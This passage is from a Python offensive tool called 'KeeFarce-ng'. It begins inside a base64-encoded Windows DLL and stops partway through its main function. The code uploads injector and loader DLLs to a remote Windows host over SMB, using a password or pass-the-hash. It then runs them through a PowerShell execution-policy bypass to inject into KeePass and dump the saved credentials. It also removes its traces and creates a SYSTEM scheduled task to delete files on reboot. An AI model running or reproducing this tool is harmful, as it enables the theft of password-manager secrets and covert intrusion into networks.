    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlAHMAXABLAFAAWAAuAGQA"
    "bABsAAAAAAAlAHMAXABrAHAAeABfAHMAdABhAHQAdQBzAC4AdAB4AHQAAAAlAHMAXABrAHAAeAAu"
    "AHQAeAB0AAAAZTENCgBlMg0KAGUzICUwOGx4DQoAZTQgJTA4bHgNCgBlNSAlMDhseA0KAG9rICUw"
    "OGx4ICVsdQ0KAAAAAABlAEIAWQA3AAAAAAAAAAAAfABnAG8AGQByADcAAAAAAGyg8ZASd2JHhrV6"
    "Xrpr2wJuoPGQEndiR4a1el66a9sC0tE5vS+6akiJsLSwy0ZokUEAAwAZAAcAGQAEAAcABAAGAA4A"
    "NwAAAAAAAAAAAAAAntsy07O5JUGCB6FIhPUyFo0YgJKODmdIswx/qDiE6N50e2V0RVJWQ1J+WURD"
    "VllUUjcAAAAAAAAAAAAAAAAAAFoARABUAFgARQBSAFIAGQBTAFsAWwA3AAAAAAAAAAAAEBoVlAMA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoBWUAwAAAAigFZQDAAAATHAVlAMAAACwRhWUAwAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATWluZ3ctdzY0IHJ1bnRpbWUgZmFpbHVy"
    "ZToKAAAAAABBZGRyZXNzICVwIGhhcyBubyBpbWFnZS1zZWN0aW9uACAgVmlydHVhbFF1ZXJ5IGZh"
    "aWxlZCBmb3IgJWQgYnl0ZXMgYXQgYWRkcmVzcyAlcAAAAAAAAAAAICBWaXJ0dWFsUHJvdGVjdCBm"
    "YWlsZWQgd2l0aCBjb2RlIDB4JXgAACAgVW5rbm93biBwc2V1ZG8gcmVsb2NhdGlvbiBwcm90b2Nv"
    "bCB2ZXJzaW9uICVkLgoAAAAAAAAAICBVbmtub3duIHBzZXVkbyByZWxvY2F0aW9uIGJpdCBzaXpl"
    "ICVkLgoAAAAAAAAAJWQgYml0IHBzZXVkbyByZWxvY2F0aW9uIGF0ICVwIG91dCBvZiByYW5nZSwg"
    "dGFyZ2V0aW5nICVwLCB5aWVsZGluZyB0aGUgdmFsdWUgJXAuCgAAAAAAADAwFZQDAAAAAAAAAAAA"
    "AABgRhWUAwAAAAAAAAAAAAAAAAAVlAMAAAAAAAAAAAAAAGBGFZQDAAAAAAAAAAAAAABgRhWUAwAA"
    "AAAAAAAAAAAAYEEVlAMAAAAAAAAAAAAAAFBwFZQDAAAAAAAAAAAAAAAkMBWUAwAAAAAAAAAAAAAA"
    "MHAVlAMAAAAAAAAAAAAAADhwFZQDAAAAAAAAAAAAAACIRhWUAwAAAAAAAAAAAAAAkEYVlAMAAAAA"
    "AAAAAAAAAJhGFZQDAAAAAAAAAAAAAACgRhWUAwAAAAAAAAAAAAAAR0NDOiAoR05VKSAxNS13aW4z"
    "MgAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE2LXdpbjMyAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkg"
    "MTYtd2luMzIAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxNS13aW4zMgAAAAAAAAAAAAAAAABHQ0M6"
    "IChHTlUpIDE1LXdpbjMyAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTUtd2luMzIAAAAAAAAAAAAA"
    "AAAAR0NDOiAoR05VKSAxNS13aW4zMgAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE1LXdpbjMyAAAA"
    "AAAAAAAAAAAAAEdDQzogKEdOVSkgMTUtd2luMzIAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxNS13"
    "aW4zMgAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE1LXdpbjMyAAAAAAAAAAAAAAAAAEdDQzogKEdO"
    "VSkgMTUtd2luMzIAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAxNS13aW4zMgAAAAAAAAAAAAAAAABH"
    "Q0M6IChHTlUpIDE1LXdpbjMyAAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTYtd2luMzIAAAAAAAAA"
    "AAAAAAAAR0NDOiAoR05VKSAxNS13aW4zMgAAAAAAAAAAAAAAAABHQ0M6IChHTlUpIDE1LXdpbjMy"
    "AAAAAAAAAAAAAAAAAEdDQzogKEdOVSkgMTUtd2luMzIAAAAAAAAAAAAAAAAAR0NDOiAoR05VKSAx"
    "Ni13aW4zMgAAAAAAAAAAAAAAAAD//////////9ApFZQDAAAAAAAAAAAAAAD//////////wAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAaFZQDAAAA8BkVlAMA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAADqEQAAAGAAAPARAAAhEwAA"
    "EGAAADATAAA/EwAAHGAAAEATAABMEwAAIGAAAFATAABREwAAJGAAAGATAACeEwAAKGAAAKATAADc"
    "EwAAMGAAAOATAACJGAAAOGAAAJAYAADkGAAARGAAAAAZAABCGQAATGAAAFAZAADCGQAAVGAAANAZ"
    "AADvGQAAYGAAAPAZAAAFGgAAZGAAABAaAACLGgAAaGAAAJAaAACTGgAAdGAAAKAaAAD+GgAAeGAA"
    "AAAbAABiHAAAhGAAAHAcAAAAIAAAkGAAAAAgAABqIAAAqGAAAHAgAAD+IAAAuGAAAAAhAACJIQAA"
    "wGAAAJAhAACSIgAAyGAAAKAiAACjIgAA0GAAALAiAADcIgAA1GAAAOAiAAAwIwAA2GAAADAjAADG"
    "IwAA3GAAANAjAABQJAAA7GAAAFAkAACHJAAA8GAAAJAkAAALJQAA9GAAABAlAABGJQAA+GAAAFAl"
    "AADZJQAA/GAAAOAlAACWJgAAAGEAAOAmAAAgJwAABGEAACAnAAA/JwAAEGEAAEAnAABdJwAAGGEA"
    "AGAnAAAnKAAAHGEAADAoAACXKAAAKGEAANApAADVKQAANGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgFAAhiBDADYAJwAVAAAAEHBAAH"
    "UgMwAmABcAEAAAABAAAAAQAAAAEEAQAEIgAAAQQBAAQiAAABDgMADgGkAgEwAAABBAEABGIAAAEE"
    "AQAEQgAAAQYDAAZCAjABYAAAAQAAAAEAAAABBgMABkICMAFgAAABAAAAAQYDAAZiAjABYAAAAQcE"
    "AAeSAzACYAFwARUKRRUDEIIMMAtgCnAJwAfQBeAD8AFQAQgFAAhCBDADYAJwAVAAAAEEAQAEYgAA"
    "AQQBAARCAAABBAEABGIAAAEAAAABAAAAAQAAAAEIBQAIQgQwA2ACcAFQAAABAAAAAQAAAAEAAAAB"
    "AAAAAQAAAAEAAAABBgMABkICMAFgAAABBQIABTIBMAEAAAABBgMABmICMAFgAAABBwQABzIDMAJg"
    "AXABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYEHgagAAAAAygAAAAQAAAAEA"
    "AAABAAAAKIAAACyAAAAwgAAA4BMAADuAAAAAAGxkcjIuZGxsAFcAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFCQAAAAAAAAAAAAACSVAACQkQAA6JAA"
    "AAAAAAAAAAAAeJUAACiSAAB4kQAAAAAAAAAAAACMlQAAuJIAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "0JIAAAAAAADekgAAAAAAAOySAAAAAAAA/JIAAAAAAAAUkwAAAAAAADCTAAAAAAAASJMAAAAAAABY"
    "kwAAAAAAAG6TAAAAAAAAgJMAAAAAAACckwAAAAAAALSTAAAAAAAAxJMAAAAAAADMkwAAAAAAANqT"
    "AAAAAAAA7JMAAAAAAAD8kwAAAAAAAAiUAAAAAAAAAAAAAAAAAAAUlAAAAAAAACKUAAAAAAAAMJQA"
    "AAAAAAA8lAAAAAAAAESUAAAAAAAATpQAAAAAAABWlAAAAAAAAGCUAAAAAAAAapQAAAAAAABylAAA"
    "AAAAAHyUAAAAAAAAhpQAAAAAAACQlAAAAAAAAJqUAAAAAAAApJQAAAAAAACwlAAAAAAAALqUAAAA"
    "AAAAAAAAAAAAAADElAAAAAAAANCUAAAAAAAAAAAAAAAAAADQkgAAAAAAAN6SAAAAAAAA7JIAAAAA"
    "AAD8kgAAAAAAABSTAAAAAAAAMJMAAAAAAABIkwAAAAAAAFiTAAAAAAAAbpMAAAAAAACAkwAAAAAA"
    "AJyTAAAAAAAAtJMAAAAAAADEkwAAAAAAAMyTAAAAAAAA2pMAAAAAAADskwAAAAAAAPyTAAAAAAAA"
    "CJQAAAAAAAAAAAAAAAAAABSUAAAAAAAAIpQAAAAAAAAwlAAAAAAAADyUAAAAAAAARJQAAAAAAABO"
    "lAAAAAAAAFaUAAAAAAAAYJQAAAAAAABqlAAAAAAAAHKUAAAAAAAAfJQAAAAAAACGlAAAAAAAAJCU"
    "AAAAAAAAmpQAAAAAAACklAAAAAAAALCUAAAAAAAAupQAAAAAAAAAAAAAAAAAAMSUAAAAAAAA0JQA"
    "AAAAAAAAAAAAAAAAAJcAQ2xvc2VIYW5kbGUA3wBDcmVhdGVGaWxlVwAHAUNyZWF0ZVRocmVhZAAA"
    "JwFEZWxldGVDcml0aWNhbFNlY3Rpb24AOAFEaXNhYmxlVGhyZWFkTGlicmFyeUNhbGxzAE0BRW50"
    "ZXJDcml0aWNhbFNlY3Rpb24AAIgCR2V0TGFzdEVycm9yAACdAkdldE1vZHVsZUZpbGVOYW1lVwAA"
    "2gJHZXRQcm9jQWRkcmVzcwAAlgNJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uAPQDTGVhdmVDcml0"
    "aWNhbFNlY3Rpb24AAPsDTG9hZExpYnJhcnlXAACpBVNsZWVwAM0FVGxzR2V0VmFsdWUA/QVWaXJ0"
    "dWFsUHJvdGVjdAAA/wVWaXJ0dWFsUXVlcnkAAEgGV3JpdGVGaWxlAHQGbHN0cmxlbkEAAJ0AX19p"
    "b2JfZnVuYwAAwgBfYW1zZ19leGl0AAB5AV9pbml0dGVybQDfAV9sb2NrAC4DX3VubG9jawDyA2Fi"
    "b3J0AAMEY2FsbG9jAAAjBGZwcmludGYAKgRmcmVlAABpBG1lbWNweQAAawRtZW1zZXQAAH0EcmVh"
    "bGxvYwCcBHN0cmxlbgAAnwRzdHJuY21wAL0EdmZwcmludGYAAM0Ed2NzY3B5AADYBHdjc3JjaHIA"
    "0QN3c3ByaW50ZkEA0gN3c3ByaW50ZlcAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAAJAAAACQAAAA"
    "kAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAAJAAAACQAAAAkAAAS0VSTkVMMzIuZGxsAAAAABSQ"
    "AAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAAABSQAAAUkAAAFJAA"
    "ABSQAAAUkAAAbXN2Y3J0LmRsbAAAKJAAACiQAABVU0VSMzIuZGxsAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAABQAAAAQoECgUKBgoGigcKAAQAAANAAA"
    "AGChgKGIoZChmKEgozCjQKNQo2CjcKOAo5CjoKOwo8Cj0KPgo/CjaKawprimAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
)

_DEFAULT_DEPLOY = r"C:\Users\Public\Documents"

def log(msg, level="*"):
    colors = {"*": "\033[34m", "+": "\033[32m", "-": "\033[31m", "!": "\033[33m"}
    c = colors.get(level, "")
    print(f"{c}[{level}]\033[0m {msg}")
def rand_name(n=6):
    return "".join(random.choices(string.ascii_lowercase, k=n))
def extract(target, domain, user, password, output=None, ldr_name="msvcfx.dll", method="tsch", smb_ver="auto", nt_hash=None, port=445, timeout=15, winrm_port=5985, deploy_dir="Users\\Public\\Documents"):
    log(f"Target: {target}")
    log(f"Credentials: {domain}\\{user}" + (" [hash]" if nt_hash else ""))
    log(f"Exec method: {method} | SMB: {smb_ver}" + (f" | port: {port}" if port != 445 else ""))

    log("Checking for running KeePass process...")
    pid = check_keepass(target, domain, user, password, method, smb_ver, nt_hash, port, timeout, winrm_port)
    if pid is None:
        log("KeePass is not running on target", "-")
        return False
    log(f"KeePass found: PID {pid}", "+")

    tag = rand_name(5)
    r_kpx = f"{tag}kp.dll"
    r_inj = f"{tag}ij.dll"
    r_ldr = f"{tag}ld.dll"
    log(f"Deployment tag: {tag}")

    tmpdir = tempfile.mkdtemp(prefix="kf_")
    kpx_path = os.path.join(tmpdir, r_kpx)
    inj_path = os.path.join(tmpdir, r_inj)
    ldr_path = os.path.join(tmpdir, r_ldr)

    with open(kpx_path, "wb") as f:
        f.write(base64.b64decode(KPX_B64))
    with open(inj_path, "wb") as f:
        f.write(base64.b64decode(INJ_B64))

    script_dir = os.path.dirname(os.path.abspath(__file__))
    ldr_src = None
    for name in ["ldr.dll", "ldr2.dll", "msvcfx.dll"]:
        p = os.path.join(script_dir, name)
        if os.path.exists(p):
            ldr_src = p
            break
    if ldr_src:
        shutil.copy2(ldr_src, ldr_path)
    else:
        with open(ldr_path, "wb") as f:
            f.write(base64.b64decode(LDR_B64))

    log(f"DLLs prepared ({os.path.getsize(kpx_path)}+{os.path.getsize(inj_path)}+{os.path.getsize(ldr_path)} bytes)")

    log("Connecting to target via SMB...")
    smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
    smb.tree_connect("C$")
    log("SMB connected", "+")

    remote_base = deploy_dir
    log("Uploading DLLs to target...")
    for local, remote in [(kpx_path, r_kpx), (inj_path, r_inj), (ldr_path, r_ldr)]:
        with open(local, "rb") as f:
            data = f.read()
        fid = smb.create(f"{remote_base}\\{remote}", 0x0012019F, 0, 5, 0x40)
        off = 0
        while off < len(data):
            chunk = data[off:off+60000]
            smb.write(fid, chunk, off)
            off += len(chunk)
        smb.close(fid)
        log(f"  Uploaded {remote}", "+")

    with open(kpx_path, "rb") as f:
        kpx_data = f.read()
    try:
        fid = smb.create(f"{remote_base}\\KPX.dll", 0x0012019F, 0, 5, 0x40)
        smb.write(fid, kpx_data)
        smb.close(fid)
    except:
        pass

    smb.logoff()
    smb.disconnect()

    log("Executing injection chain...")
    deploy_abs = "C:\\" + deploy_dir
    ps_cmd = (
        f'powershell -ep bypass -c '
        f'"[Reflection.Assembly]::LoadFile(\'{deploy_abs}\\{r_inj}\')'
        f';[Inj.I]::Run(\'{deploy_abs}\\{r_ldr}\')"'
    )
    out = _remote_exec(target, domain, user, password, ps_cmd, method, smb_ver, nt_hash, port, timeout, winrm_port)
    log(f"Injection output: {out.strip()[-200:]}")

    log("Waiting for payload execution (5s)...")
    time.sleep(5)

    smb = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
    smb.tree_connect("C$")

    for remote in ["kpx.txt", "kpx_status.txt", "inj_log.txt"]:
        try:
            fid = smb.create(f"{remote_base}\\{remote}", 0x80|0x01, 1, 1, 0x40)
            data = b''
            off = 0
            while True:
                try:
                    chunk = smb.read(fid, 65536, off)
                    if not chunk: break
                    data += chunk
                    off += len(chunk)
                except: break
            smb.close(fid)
            if data:
                with open(os.path.join(tmpdir, remote), "wb") as f:
                    f.write(data)
        except:
            pass

    status_file = os.path.join(tmpdir, "kpx_status.txt")
    if os.path.exists(status_file):
        with open(status_file) as f:
            log(f"Payload status: {f.read().strip()}")

    inj_log = os.path.join(tmpdir, "inj_log.txt")
    if os.path.exists(inj_log):
        with open(inj_log) as f:
            log(f"Injection log: {f.read().strip()}")

    kpx_txt = os.path.join(tmpdir, "kpx.txt")
    if os.path.exists(kpx_txt) and os.path.getsize(kpx_txt) > 0:
        if output is None:
            output = f"keepass_{target.replace('.', '_')}.txt"
        shutil.copy2(kpx_txt, output)
        with open(output, "r", encoding="utf-8", errors="replace") as f:
            data = f.read()
        entry_count = data.count("\n[")
        log(f"EXTRACTED {entry_count} entries -> {output}", "+")
        print(data)
    else:
        log("No output file. Payload may have failed.", "-")

    log("Cleaning up target...")
    for fn in [r_inj, "kpx.txt", "kpx_status.txt", "inj_log.txt", "kpx.txt.err"]:
        try:
            fid = smb.create(f"{remote_base}\\{fn}", 0x10080, 7, 1, 0x1040)
            smb.close(fid)
        except: pass

    smb.logoff()
    smb.disconnect()

    tn2 = rand_name(8)
    _remote_exec(target, domain, user, password,
                 f'schtasks /create /tn "{tn2}" /tr '
                 f'"cmd /c del /f /q {deploy_abs}\\KPX.dll {deploy_abs}\\{r_kpx} {deploy_abs}\\{r_ldr}" '
                 f'/sc onstart /ru SYSTEM /f', method, smb_ver, nt_hash, port, timeout, winrm_port)
    log(f"Locked DLLs scheduled for deletion on reboot (task: {tn2})", "+")

    if _atexec_tmp_files:
        try:
            smb3 = _smb_session(target, domain, user, password, smb_ver, nt_hash, port, timeout)
            smb3.tree_connect("ADMIN$")
            for tf in _atexec_tmp_files:
                try:
                    fid = smb3.create(f"Temp\\{tf}", 0x10080, 7, 1, 0x1040)
                    smb3.close(fid)
                except: pass
            smb3.logoff()
            smb3.disconnect()
        except: pass
        _atexec_tmp_files.clear()
        log("Remote temp files cleaned", "+")

    shutil.rmtree(tmpdir, ignore_errors=True)
    log("Local temp files cleaned", "+")
    return output is not None and os.path.exists(output)
def extract_local(output=None):
    log("Local mode - extracting from local KeePass process")
    try:
        r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq KeePass.exe", "/FO", "CSV", "/NH"],
                           capture_output=True, text=True, timeout=10)
        lines = [l for l in r.stdout.strip().split("\n") if "KeePass" in l]
    except FileNotFoundError:
        r = subprocess.run(["powershell", "-c", "Get-Process KeePass -ErrorAction SilentlyContinue | Select-Object Id | Format-List"],
                           capture_output=True, text=True, timeout=10)
        lines = [l for l in r.stdout.strip().split("\n") if l.strip()]
    if not lines:
        log("KeePass is not running", "-")
        return False
    log(f"KeePass found", "+")

    tag = rand_name(5)
    deploy = os.path.join(os.environ.get("PUBLIC", os.environ.get("TEMP", ".")), "Documents")
    if not os.path.isdir(deploy):
        deploy = os.environ.get("TEMP", ".")

    r_kpx = f"{tag}kp.dll"
    r_inj = f"{tag}ij.dll"
    r_ldr = f"{tag}ld.dll"

    inj_path = os.path.join(deploy, r_inj)
    ldr_path = os.path.join(deploy, r_ldr)
    kpx_path = os.path.join(deploy, "KPX.dll")
    kpx_copy = os.path.join(deploy, r_kpx)

    with open(inj_path, "wb") as f: f.write(base64.b64decode(INJ_B64))
    with open(ldr_path, "wb") as f: f.write(base64.b64decode(LDR_B64))
    with open(kpx_path, "wb") as f: f.write(base64.b64decode(KPX_B64))
    with open(kpx_copy, "wb") as f: f.write(base64.b64decode(KPX_B64))
    log(f"DLLs written to {deploy}", "+")

    log("Executing injection chain...")
    ps = (f'[Reflection.Assembly]::LoadFile(\"{inj_path}\");'
          f'[Inj.I]::Run(\"{ldr_path}\")')
    r = subprocess.run(["powershell", "-ep", "bypass", "-c", ps],
                       capture_output=True, text=True, timeout=30)
    if r.stdout.strip():
        log(f"Injection output: {r.stdout.strip()[-200:]}")

    log("Waiting for payload (5s)...")
    time.sleep(5)

    status_f = os.path.join(deploy, "kpx_status.txt")
    if os.path.exists(status_f):
        with open(status_f) as f: log(f"Payload status: {f.read().strip()}")

    kpx_out = os.path.join(deploy, "kpx.txt")
    if os.path.exists(kpx_out) and os.path.getsize(kpx_out) > 0:
        if output is None:
            output = "keepass_local.txt"
        shutil.copy2(kpx_out, output)
        with open(output, "r", encoding="utf-8", errors="replace") as f:
            data = f.read()
        entry_count = data.count("\n[")
        log(f"EXTRACTED {entry_count} entries -> {output}", "+")
        print(data)
    else:
        log("No output. Payload may have failed.", "-")

    for f in [inj_path, kpx_copy, kpx_path, ldr_path,
              os.path.join(deploy, "kpx.txt"),
              os.path.join(deploy, "kpx_status.txt"),
              os.path.join(deploy, "inj_log.txt")]:
        try: os.remove(f)
        except: pass
    log("Cleanup done", "+")
    return output is not None and os.path.exists(output)

def print_banner():
    if sys.stdout.isatty():
        C, D, X = "\033[91m", "\033[2m", "\033[0m"
    else:
        C = D = X = ""
    print(f"""{C}
  ██╗  ██╗███████╗███████╗███████╗ █████╗ ██████╗  ██████╗███████╗
  ██║ ██╔╝██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  █████╔╝ █████╗  █████╗  █████╗  ███████║██████╔╝██║     █████╗
  ██╔═██╗ ██╔══╝  ██╔══╝  ██╔══╝  ██╔══██║██╔══██╗██║     ██╔══╝
  ██║  ██╗███████╗███████╗██║     ██║  ██║██║  ██║╚██████╗███████╗
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
  {D}                                  KeeFarce-ng v1.0 | @5ubut4i{X}
""")

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="KeeFarce-NG",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Execution Methods:
  tsch      Task Scheduler via SMB named pipe (port 445) [default]
  svcctl    Service Control Manager via SMB named pipe (port 445)
  wmi       WMI via DCOM (port 135 + dynamic high port)
  winrm     Windows Remote Management via HTTP (port 5985)

SMB Dialects:
  auto      Negotiate best available: SMB2/3 first, fallback to SMB1 [default]
  1         Force SMB1 (NT LM 0.12)
  2         Force SMB2 (2.0.2 / 2.1)
  3         Force SMB3 (3.0 / 3.0.2 / 3.1.1)

Credentials Format:
  DOMAIN/user:password    Domain account (e.g. CORP/admin:Pass123)
  ./user:password         Local account (e.g. ./Administrator:Pass123)
  DOMAIN/user             When using --hashes (no password needed)

Authentication:
  Password                Default, credentials in DOMAIN/user:password format
  Pass-the-Hash           Use --hashes with LMHASH:NTHASH or :NTHASH

Modes:
  Remote    Upload DLLs via SMB, trigger injection via chosen exec method
  Local     Run directly on target machine (--local), no network needed

Examples:
  %(prog)s --local
  %(prog)s --local -o loot.txt
  %(prog)s 192.168.1.10 CORP/admin:Pass123
  %(prog)s 192.168.1.10 ./Administrator:Pass123
  %(prog)s 192.168.1.10 ./admin:Pass -o loot.txt --ldr-name svc.dll
  %(prog)s 192.168.1.10 CORP/admin:Pass --exec-method svcctl
  %(prog)s 192.168.1.10 CORP/admin:Pass --exec-method winrm
  %(prog)s 192.168.1.10 CORP/admin:Pass --exec-method wmi
  %(prog)s 192.168.1.10 CORP/admin:Pass --smb 1
  %(prog)s 192.168.1.10 CORP/admin:Pass --smb 3 --exec-method svcctl
  %(prog)s 192.168.1.10 CORP/admin --hashes :aad3b435b51404ee
  %(prog)s 192.168.1.10 CORP/admin:Pass --exec-method winrm --winrm-port 5986
  %(prog)s 192.168.1.10 CORP/admin:Pass --port 4445 --timeout 30""")
    parser.add_argument("target", nargs="?", help="Target IP/hostname")
    parser.add_argument("credentials", nargs="?",
                        help="domain/user:password (use ./user:pass for local)")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("--local", action="store_true",
                        help="Extract from KeePass on this machine (no creds needed)")
    parser.add_argument("--exec-method", choices=["tsch", "svcctl", "wmi", "winrm"],
                        default="tsch", help="Remote execution method (default: tsch)")
    parser.add_argument("--smb", choices=["auto", "1", "2", "3"],
                        default="auto", help="Force SMB dialect (default: auto-negotiate)")
    parser.add_argument("--ldr-name", default="msvcfx.dll",
                        help="Loader DLL filename on target (default: msvcfx.dll)")
    parser.add_argument("--hashes", metavar="LMHASH:NTHASH",
                        help="NTLM hashes for pass-the-hash (e.g. :aad3b435b51404ee or LM:NT)")
    parser.add_argument("--port", type=int, default=445,
                        help="SMB port (default: 445)")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Connection timeout in seconds (default: 15)")
    parser.add_argument("--winrm-port", type=int, default=5985,
                        help="WinRM port (default: 5985, use 5986 for HTTPS)")
    parser.add_argument("--deploy-dir", default="Users\\Public\\Documents",
                        help="Remote deploy directory relative to C$ (default: Users\\Public\\Documents)")

    args = parser.parse_args()

    if args.local:
